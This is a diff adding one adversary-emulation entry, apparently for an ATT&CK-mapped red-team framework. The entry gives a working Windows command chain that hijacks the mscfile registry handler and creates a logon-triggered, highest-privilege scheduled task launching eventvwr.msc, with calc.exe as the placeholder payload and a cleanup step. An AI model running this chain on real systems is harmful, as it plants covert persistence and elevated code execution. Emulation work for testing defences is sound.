@@ -1,0 +1,20 @@
+---
+- id: b73bae40cfc51cdceaea8fd948d04d5c
+  name: Scheduled Task Persistence via Eventviewer.msc
+  description: "Adds persistence by abusing `eventviewer.msc` via a scheduled task.\n\
+    When the eventviewer console is opened, it will run a malicious payload (in this\
+    \ case, `calc.exe`). \n"
+  tactic: multiple
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
+          /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f && schtasks
+          /Create /TN "#{task_name}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
+          && ECHO Let's run the schedule task ... && schtasks /Run /TN "EventViewerBypass"
+        payloads: []
+        cleanup: reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
+          /f && schtasks /Delete /TN "EventViewerBypass" /F
